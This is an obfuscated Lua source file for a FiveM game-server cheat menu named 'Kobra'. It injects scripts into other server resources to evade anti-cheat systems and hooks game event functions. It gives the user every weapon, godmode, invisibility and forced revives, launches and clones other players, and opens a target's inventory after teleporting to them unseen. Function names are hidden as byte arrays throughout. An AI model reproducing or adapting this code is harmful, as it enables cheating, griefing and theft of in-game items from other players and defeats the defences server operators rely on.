            ]],v248));break;end if (v1076==0) then v244:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v1076=1;end end end break;end if (v246==(0 -0)) then if ( not v245 or (v245=="")) then return;end v247=nil;v246=140 -(43 + 96) ;end end end;v12.GiveAllWeapons=function(v252) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v253) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v254,v255,v256) local v257=0 -0 ;local v258;local v259;while true do if (v257==(6 -3)) then CreateThread(function() local v702=0;local v703;local v704;local v705;local v706;local v707;local v708;local v709;local v710;local v711;while true do if (v702==(1 + 0)) then if ( not v704 or  not DoesEntityExist(v704)) then return;end v705=PlayerPedId();if  not v705 then return;end v702=1 + 1 ;end if (v702==2) then v706=GetEntityCoords(v705);v707=GetEntityCoords(v704);if ( not v706 or  not v707) then return;end v702=5 -2 ;end if (v702==(3 + 3)) then ClearPedTasksImmediately(v705);if v710 then local v1077=0 -0 ;while true do if (v1077==(1 + 0)) then SetEntityCoords(v705,v710.x,v710.y,v710.z,false,false,false,false);break;end if (v1077==(0 + 0)) then SetEntityCoords(v705,v710.x,v710.y,v710.z + 1 ,false,false,false,false);Wait(1851 -(1414 + 337) );v1077=1941 -(1642 + 298) ;end end end if v709 then SetEntityVisible(v705,true,0 -0 );end break;end if (v702==4) then if (v708>(28 -18)) then local v1078=0 -0 ;local v1079;local v1080;local v1081;local v1082;local v1083;while true do if (v1078==(0 + 0)) then v710=v706;v1079=math.random() * (2 + 0) * math.pi ;v1078=973 -(357 + 615) ;end if (v1078==(3 + 0)) then SetEntityCoordsNoOffset(v705,v1083.x,v1083.y,v1083.z,false,false,false);SetEntityVisible(v705,false,0 -0 );v1078=4 + 0 ;end if (v1078==(2 -1)) then v1080=math.random(5,8 + 1 );v1081=math.cos(v1079) * v1080 ;v1078=1 + 1 ;end if (v1078==(2 + 0)) then v1082=math.sin(v1079) * v1080 ;v1083=vector3(v707.x + v1081 ,v707.y + v1082 ,v707.z);v1078=3;end if (v1078==(1305 -(384 + 917))) then v709=true;Wait(797 -(128 + 569) );break;end end end v711=v259(v707,v256);if ( #v711==(1543 -(1407 + 136))) then end v702=1892 -(687 + 1200) ;end if (v702==(1713 -(556 + 1154))) then v708= #(v706-v707);v709=false;v710=nil;v702=4;end if (v702==(17 -12)) then ClearPedTasksImmediately(v705);for v981=96 -(9 + 86) ,436 -(275 + 146)  do if  not DoesEntityExist(v704) then break;end local v982=GetEntityCoords(v704);if  not v982 then break;end SetEntityCoords(v705,v982.x,v982.y,v982.z + 0.5 + 0 ,false,false,false,false);Wait(114 -(29 + 35) );AttachEntityToEntityPhysically(v705,v704,0,0 -0 ,0,0,150,0,0 -0 ,0,0,0,4 -3 ,false,false,1,2 + 0 );Wait(1062 -(53 + 959) );DetachEntity(v705,true,true);Wait(508 -(312 + 96) );end Wait(867 -367 );v702=291 -(147 + 138) ;end if (v702==0) then v703=GetPlayerFromServerId(v258);if ( not v703 or (v703== -(900 -(813 + 86)))) then return;end v704=GetPlayerPed(v703);v702=1;end end end);break;end if (v257==(1 + 0)) then if  not v258 then return;end v256=v256 or (5558 -2558) ;v257=494 -(18 + 474) ;end if (v257==(0 + 0)) then if ( not v255 or ( #v255==0)) then return;end v258=tonumber(v255[3 -2 ]);v257=1087 -(860 + 226) ;end if (v257==(305 -(121 + 182))) then v259=nil;function v259(v712,v713) local v714=0 + 0 ;local v715;local v716;while true do if (v714==(1242 -(988 + 252))) then return v715;end if (v714==(1 + 0)) then if  not v716 then return v715;end for v983=0,80 + 175  do local v984=GetPlayerFromServerId(v983);if (v984 and (v984~= -(1971 -(49 + 1921))) and DoesEntityExist(GetPlayerPed(v984))) then local v1114=GetPlayerPed(v984);local v1115=GetEntityCoords(v1114);if v1115 then local v1229=890 -(223 + 667) ;local v1230;while true do if ((52 -(51 + 1))==v1229) then v1230= #(v712-v1115);if (v1230<=v713) then table.insert(v715,{player=v984,serverId=v983});end break;end end end end end v714=2 -0 ;end if (v714==(0 -0)) then v715={};v716=PlayerPedId();v714=1126 -(146 + 979) ;end end end v257=1 + 2 ;end end end;v12.HandleClonePlayer=function(v260,v261) local v262=0;local v263;while true do if (v262==1) then MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v263));break;end if (v262==(605 -(311 + 294))) then if ( not v261 or ( #v261==(0 -0))) then return;end v263=table.concat(v261,",");v262=1;end end end;v12.HandleTakeInventory=function(v264,v265) local v266=0;local v267;local v268;while true do if (v266==(0 + 0)) then if ( not v265 or ( #v265==0)) then return;end v267=tonumber(v265[1]);v266=1;end if (v266==(1445 -(496 + 947))) then v268=GetResourceState("WaveShield")=="started" ;if v268 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v267));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v267));end break;end if (v266==1) then if  not v267 then return;end print("Take Inventory action executed for players: "   .. table.concat(v265,", ") );v266=2;end end end;v12.BuildMenuFromWeaponList=function(v269,v270) local v271=1358 -(1233 + 125) ;local v272;while true do if (v271==(1 + 0)) then return v272;end if (v271==(0 + 0)) then v272={};for v717,v718 in ipairs(v270) do if v46[v718] then v272[ #v272 + 1 ]=v46[v718].label;end end v271=1;end end end;v12.GetWeaponModelFromLabel=function(v273,v274) local v275=0;while true do if (v275==(0 + 0)) then for v719,v720 in pairs(v46) do if (v720.label==v274) then return v719;end end return "";end end end;v12.RepairVehicle=function(v276) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v93=GetResourceState("ReaperV4")=="started" ;local v94=GetResourceState("WaveShield")=="started" ;local v95=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v277) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v338=0 + 0 ;local v339;while true do if (v338==(1504 -(504 + 1000))) then v339={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v94 then TriggerEvent("deathscreen:revive");elseif v93 then MachoInjectThread(0 + 0 ,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v95 then if v93 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v782=0 -0 ;local v783;local v784;while true do if (v782==1) then v784=GetResourceState("ReaperV4")=="started" ;if v783 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v784 then MachoInjectThread(0 + 0 ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end if (v782==(0 + 0)) then print("2");v783=GetResourceState("WaveShield")=="started" ;v782=183 -(156 + 26) ;end end end,["mc9-medicsystem"]=function() local v785=0;local v786;local v787;while true do if ((0 + 0)==v785) then print("1");v786=GetResourceState("WaveShield")=="started" ;v785=1 -0 ;end if (v785==(165 -(149 + 15))) then v787=GetResourceState("ReaperV4")=="started" ;if v786 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v787 then MachoInjectThread(960 -(890 + 70) ,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end end end};for v788,v789 in pairs(v339) do if (GetResourceState(v788)=="started") then v789();end end break;end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=582 -(14 + 468) ,min=0 -0 ,max=100,step=2 -1 ,onSelect=function(v340) SetEntityHealth(PlayerPedId(),v340 + 52 + 48 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=61 + 39 ,min=0 + 0 ,max=46 + 54 ,step=1 + 0 ,onSelect=function(v341) SetPedArmour(PlayerPedId(),v341);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),100);end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v342) v277:HandleGodmodeToggle(v342);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v343) if v343 then v277:EnableInvisibility();else v277:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25,step=0.25,min=0.25,max=1 + 4 ,onSelect=function(v344,v345) if v345 then if  not v29 then local v790=51 -(12 + 39) ;while true do if (v790==(0 + 0)) then v12:Notify("info","Kobra","Initializing... Please wait!",3095 -2095 );Wait(400);v790=3 -2 ;end if (1==v790) then v29=true;break;end 